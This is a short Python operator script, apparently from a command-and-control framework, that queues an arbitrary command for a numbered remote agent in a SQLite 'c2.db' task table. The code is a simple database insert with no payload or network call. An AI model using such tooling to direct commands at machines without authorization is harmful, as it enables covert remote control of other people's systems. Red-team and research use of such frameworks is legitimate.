#!/usr/bin/env python3
import sqlite3
import sys
import os

DB_PATH = "db/c2.db"

def insert_task(agent_id, command):
    if not os.path.exists(DB_PATH):
        print("[-] C2 database not found.")
        return

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT INTO tasks (agent_id, command, status) VALUES (?, ?, 'queued')", (agent_id, command))
    conn.commit()
    conn.close()
    print(f"[+] Task queued for agent {agent_id}: {command}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./add_task.py <agent_id> <command>")
        sys.exit(1)

    agent_id = int(sys.argv[1])
    command = sys.argv[2]
    insert_task(agent_id, command)